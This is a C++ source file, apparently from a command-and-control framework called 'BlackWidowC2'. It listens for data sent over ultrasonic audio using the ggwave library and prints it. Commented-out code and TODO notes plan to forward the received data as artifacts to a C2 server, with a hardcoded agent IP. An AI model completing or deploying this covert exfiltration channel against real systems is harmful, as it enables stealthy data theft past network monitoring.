#include "BlackWidowC2.h"
#include "Ultrasonic.h"
#undef main

#include <ggwave/ggwave.h>
#include <iostream>
#include <mutex>
#include <thread>

int main()
{
	int txProtocol = GGWAVE_TX_PROTOCOL_ULTRASOUND_FASTEST;

	ultrasonic::Ultrasonic ultrasonic;

	auto ggWave = ultrasonic.get_ggwave(); 

	printf("Available Tx protocols:\n");
	const auto& protocols = GGWave::getTxProtocols();
	for (const auto& protocol : protocols) {
		printf("    -t%d : %s\n", protocol.first, protocol.second.name);
	}

	if (txProtocol < 0 || txProtocol >(int) ggWave->getTxProtocols().size()) {
		fprintf(stderr, "Unknown Tx protocol %d\n", txProtocol);
		return -3;
	}

	printf("Selecting Tx protocol %d\n", txProtocol);

	std::mutex mutex;

	while (true) {
		std::this_thread::sleep_for(std::chrono::milliseconds(1));
		{
			std::lock_guard<std::mutex> lock(mutex);
			ultrasonic.run_logic();

			GGWave::TxRxData rxData;
			auto rxDataLength = ggWave->takeRxData(rxData);
			if (rxDataLength > 0)
			{
				// TODO: need to listen with ultrasonic lib, when something catched -> build send artifact to C2

				// If not exist agent - creates new one and saves artifact
				// If already exist - only saves artifact
				// TODO: need to find primary IP (currently hardcoded to "10.123.0.21")
				std::string data(rxData.begin(), rxData.end());
				data.resize(rxDataLength);
				std::cout << data << std::endl;
				
				//const std::string artifact_start = "{\"agentIp\": \"10.123.0.21\",\"content\": \"{\\\"data\\\":\\\"";
				//const std::string artifact = artifact_start + data + "\\\"}\"}";
				//
				//sendArtifact(artifact.c_str());
			}
		}
	}
}
